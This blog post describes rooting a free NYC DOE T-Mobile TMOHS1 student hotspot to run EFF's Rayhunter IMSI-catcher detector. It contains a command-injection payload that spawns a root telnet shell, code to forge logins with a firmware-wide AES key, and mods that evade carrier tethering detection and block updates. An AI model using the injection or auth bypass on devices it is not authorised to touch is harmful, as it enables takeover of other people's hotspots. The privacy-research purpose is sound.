---
layout: post
title: "Turning a Free NYC DOE Student Hotspot into a Rayhunter"
date: 2026-05-12 12:00:00 +0000
categories: privacy security hardware
excerpt: "The NYC Department of Education hands out free T-Mobile hotspots to public school students through Project 10Million. The device they ship — the TMOHS1 — happens to be a Qualcomm-based LTE modem that Rayhunter, EFF's IMSI catcher detector, supports out of the box. Here is how we turned a donated student hotspot into a $0 cell-site simulator detector."
---

The NYC Department of Education will mail a free T-Mobile hotspot, with a five-year data plan attached, to any public school household that asks. The device is a [Wingtech TMOHS1](https://www.fcc.gov/oet/ea/fccid/) running a Qualcomm MDM9607 modem — modest hardware, but it is the same chipset family that [Rayhunter](https://efforg.github.io/rayhunter/), EFF's IMSI catcher detector, targets first-class. With about an hour of work, the device the DOE intends for a child's homework turns into a personal surveillance-detection rig that rides on whatever cell you happen to be near.

This post walks through the conversion: the program, the device, the authentication quirks, the install, and the modifications that make the hotspot more useful as a research tool.

## The free hardware: Project 10Million

[Project 10Million](https://www.t-mobile.com/brand/project-10-million) is T-Mobile's K–12 connectivity program. It is the pipeline NYC DOE uses to hand hotspots to families. For eligible households the headline numbers are:

- **Free hotspot device** — typically the TMOHS1, sometimes a Franklin T9 or similar.
- **200 GB of high-speed LTE data per year**, resetting on the device's activation anniversary.
- **Five years** of renewals before the plan expires.
- **No SIM swap, no contract, no credit check** — the line is provisioned to the device.
- **Out-of-bundle data** is sold as $10 for 10 GB add-ons.
- **Video is throttled to ~2.5 Mbps (SD)**; the plan is not intended for streaming.
- **No domestic or international roaming.**

In New York City the practical onramp is the [DOE's "Internet at Home" portal](https://www.schools.nyc.gov/learning/learning-at-home). A parent or guardian requests a device, an eligibility check confirms the student is enrolled (and usually that the family qualifies for free/reduced lunch), and a TMOHS1 ships within a couple of weeks. There is no per-month bill. The hardware and the line stay free until the student ages out or the family returns the device.

That is roughly $1,200 of cellular service the DOE is shipping into Title I households on T-Mobile's dime. It is also the cheapest LTE modem you will ever get your hands on, and the one that most lab work on IMSI catchers has converged around.

## What Rayhunter actually does

[Rayhunter](https://github.com/EFForg/rayhunter) is an EFF project that watches the Qualcomm diagnostic stream (QMDL) coming off the modem and flags signatures associated with **cell-site simulators** — Stingrays, Hailstorms, Triggerfish, and whatever the new generations are calling themselves. The signatures Rayhunter looks for are things only a real LTE modem can see: forced 2G downgrades, suspicious cipher renegotiations, IMSI catcher–style identity requests, weird neighbor cell lists, towers that pop up out of nowhere with no PCI history.

You cannot run Rayhunter on a phone, because Android and iOS hide the diagnostic interface behind vendor signatures. You can run it on devices that expose `/dev/diag` or the Qualcomm QMI service to userspace — which is exactly what cheap LTE hotspots like the TMOHS1 do, because their firmware was never hardened against the device's owner.

When Rayhunter sees something interesting it pushes a notification (we'll use [ntfy](https://ntfy.sh/) for that below) and saves a QMDL/PCAP pair you can review or share with researchers.

## The TMOHS1 in one paragraph

The TMOHS1 is a single-band-aggregated LTE modem (no 5G, no 3G — T-Mobile retired 3G in 2022, so the device is effectively LTE-only on bands 2, 4, 5, 12, 25, 26, 41, 66, and 71). It runs a stripped-down OpenWRT-adjacent Linux on the MDM9607, with a busybox userland, a CGI admin panel at `http://192.168.0.1/`, and a 2.4/5 GHz Wi-Fi radio that tops out at eight clients. The shipping firmware is `TMOHS1_00.05.20`. Everything we do below assumes that firmware.

## Step 1 — Find the admin password

The web UI is gated by an admin password. Two ways to recover it on a device you own:

1. **Sticker check.** Some shipments have the default password printed on the back. NYC DOE units usually have it removed.
2. **OTA pull from the modem.** With USB tethering on, you can ask the modem over AT commands or read it out of NVRAM via the `qcmap_auth` flow. EFF's installer does this for you; if you'd rather do it by hand, [parker-stephens/TMOHS1-Root-Utility](https://github.com/parker-stephens/TMOHS1-Root-Utility) is the cleanest reference.

If you bought the device on eBay/secondhand and the password is gone, the only path is to factory-reset (hold the reset pinhole for ten seconds with the unit powered on) and let it provision again — the reset returns it to a printed/known default.

## Step 2 — Authenticate (and watch the encoding bug)

Authentication is **AES-128-ECB with PKCS7 padding, then base64**, posted to `/cgi-bin/qcmap_auth`. The AES key is baked into the firmware and is the same across every TMOHS1 in the field. The official installer handles this for you — except for a single bug:

> The `./installer tmobile` flow URL-encodes the base64 `=` and `+` characters in the encrypted password. The CGI on the device rejects the percent-encoded form. The login fails silently and the install never starts.

I filed [EFForg/rayhunter#950](https://github.com/EFForg/rayhunter/issues/950) for this. Until it lands, doing the login by hand is more reliable. The relevant Python is short enough to inline:

```python
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding

AES_KEY      = b'<the firmware-baked key>'
ADMIN_PASS   = b'<your admin password>'

padder = padding.PKCS7(128).padder()
padded = padder.update(ADMIN_PASS) + padder.finalize()
ct = Cipher(algorithms.AES(AES_KEY), modes.ECB()).encryptor()
enc = ct.update(padded) + ct.finalize()
print(base64.b64encode(enc).decode())
```

POST that ciphertext as `pwd=` (raw base64, no percent-encoding) to `qcmap_auth` along with `type=login&timeout=600000&user=admin`. The response is JSON with a `token` field that authenticates every subsequent CGI call for ten minutes.

## Step 3 — Pop a shell via the MAC filter

The TMOHS1 web app has a classic CGI command-injection in its MAC filter handler. POSTing to `/cgi-bin/qcmap_web_cgi` with a `mac=` value that contains `||<command>` runs the command as root. Both EFF's installer and the parker-stephens utility use the same shape:

```
page=setFWMacFilter&cmd=del&mode=0
&mac=50:5A:CA:B5:05||busybox telnetd -l /bin/sh
&key=50:5A:CA:B5:05:AC&token=<TOKEN>
```

After that injection, `telnet 192.168.0.1` drops you into a root shell. Remount root read-write with `mount -o remount,rw /` and you are ready to install. Note: you are doing this on a device you own, on a network nobody else is using; do not run any of this against hardware that isn't yours.

## Step 4 — Install Rayhunter by hand

The fastest path is to skip the bundled installer and lay down the four files Rayhunter needs:

| Path | Purpose |
|---|---|
| `/data/rayhunter/rayhunter-daemon` | The daemon binary (ARM Linux) |
| `/data/rayhunter/config.toml` | Set `device = "tmobile"` so it speaks the right QMI dialect |
| `/etc/init.d/rayhunter_daemon` | Init script for the daemon itself |
| `/etc/init.d/misc-daemon` | Init script that starts Rayhunter at boot |

Push them with `nc`/`ftpput`/`wget` from inside the telnet session, `chmod +x` the scripts, run the misc-daemon once to confirm, and then reboot. The web UI comes up at `http://192.168.0.1:8080` with no auth.

## Step 5 — Mods that make the hotspot useful as a research device

Out of the box the TMOHS1 is a hotspot. With about six small init scripts it becomes a respectable little Linux box you can SSH-equivalent into from your phone:

| Mod | Why |
|---|---|
| TTL masking via `iptables` (set outgoing TTL to 64) | Stops the carrier from spotting tethered devices behind the hotspot. |
| Custom DNS pinned to `1.1.1.1` (rewrite `/etc/resolv.conf` every 15s) | Survives DHCP renewals. Kills T-Mobile's DNS-based ad insertion. |
| Disable firmware updates (move `start_omadm_le` aside) | Otherwise OMA-DM will eventually overwrite `/etc/init.d` and unroot the device. Keep a backup at `/etc/backups/init.d/start_omadm_le` in case you need to restore. |
| Persistent ADB (`/sbin/usb/compositions/9025` at boot) | Real ADB shell over USB, surviving reboots. |
| Anonymous FTP on port 21 | Trivial way to pull QMDL captures off the device without an SCP server. |
| `/data/custom_scripts/*.sh` runner | A tiny framework that runs every `.sh` in a directory at boot. Drop in `recon.sh`, `portscan.sh`, whatever. |

Symlink each init script under `/etc/rc5.d/S99…` so the device launches them at the right runlevel. Once they are in place, changing the Wi-Fi band, SSID, password, APN, or even unplugging the device does nothing to the mods. The two things that *will* wipe Rayhunter are (a) a factory reset, which clears `/data/`, and (b) a firmware update — which is why disabling OMA-DM matters.

## Step 6 — Notifications

Rayhunter supports [ntfy.sh](https://ntfy.sh/) out of the box. Create a private topic, drop it into `config.toml`, and you get a push on your phone every time the daemon flags a Warning or LowBattery event. The topic is the only credential; pick a high-entropy string and treat it like a webhook URL.

## Driving the device

I wrote a [`tmohs1-shell.sh`](https://github.com/jbwashington) helper that wraps the encrypt-login-inject dance and exposes the device as a normal command-line tool:

```
./tmohs1-shell.sh              # root shell via telnet
./tmohs1-shell.sh --adb        # enable ADB + telnet shell
./tmohs1-shell.sh --recon      # network recon (interfaces, ARP, iptables, cell info)
./tmohs1-shell.sh --scan HOST  # nc-based port scan from the hotspot's cellular IP
./tmohs1-shell.sh --sms NUM "message"   # send SMS via the modem (AT+CMGS over /dev/smd11)
./tmohs1-shell.sh --sms-read   # read inbox via the CGI
./tmohs1-shell.sh --ftp        # FTP connection info
./tmohs1-shell.sh --status     # check every mod's health
```

Credentials live in a gitignored `.env` (`DEVICE_IP`, `ADMIN_PASSWORD`, `AES_KEY`, `IMEI`, `IMSI`, `NTFY_TOPIC`). Nothing about the toolkit is TMOHS1-specific; you could adapt the same pattern to any Qualcomm hotspot that exposes a `qcmap_auth` CGI.

## What you actually get

A pocketable LTE modem with:

- A working IMSI catcher detector, fed by a real Qualcomm diagnostic stream, scanning every cell the device camps on.
- Push notifications to your phone the moment Rayhunter flags something.
- A scriptable Linux box on the cellular network, with `tcpdump`, `nc`, `curl`, `traceroute`, and the entire busybox toolbox.
- A captive cellular IP you can use as a vantage point for measurement work that you don't want originating from your home connection.
- 200 GB of free LTE data a year for five years.

It is the cheapest serious privacy-research device on the market, and the marginal cost is zero if you're already eligible for the program.

## Caveats

- **This is your device.** Project 10Million ships the hotspot to the household, not the school; you own the hardware. That said, this kind of modification voids any warranty and almost certainly violates T-Mobile's Acceptable Use Policy. Do not present the modified device for service; do not run it against anyone else's network.
- **Rayhunter is a research tool, not a guarantee.** It catches signatures of known cell-site simulators. Operators who care will adapt. Treat hits as a prompt to investigate, not as evidence.
- **The QMDL captures contain your own cell traffic metadata.** If you share them with researchers, sanitize first.
- **Firmware updates are paused, not disabled.** If T-Mobile ever pushes a forced update via a different channel (e.g., the modem-side carrier update), Rayhunter goes with it. Snapshot `/etc/init.d/` and `/data/rayhunter/` somewhere off-device.

## Further reading

- [Rayhunter — EFF](https://efforg.github.io/rayhunter/)
- [Rayhunter source — `EFForg/rayhunter`](https://github.com/EFForg/rayhunter)
- [TMOHS1 Root Utility — parker-stephens](https://github.com/parker-stephens/TMOHS1-Root-Utility)
- [Project 10Million](https://www.t-mobile.com/brand/project-10-million)
- [NYC DOE — Learning at Home / Internet at Home](https://www.schools.nyc.gov/learning/learning-at-home)
- The TMOHS1-installer URL-encoding bug: [EFForg/rayhunter#950](https://github.com/EFForg/rayhunter/issues/950)

The whole exercise took an afternoon. The TMOHS1 has been sitting on my desk for two months now, paging me whenever it sees something it doesn't like, on a connection that costs me nothing.
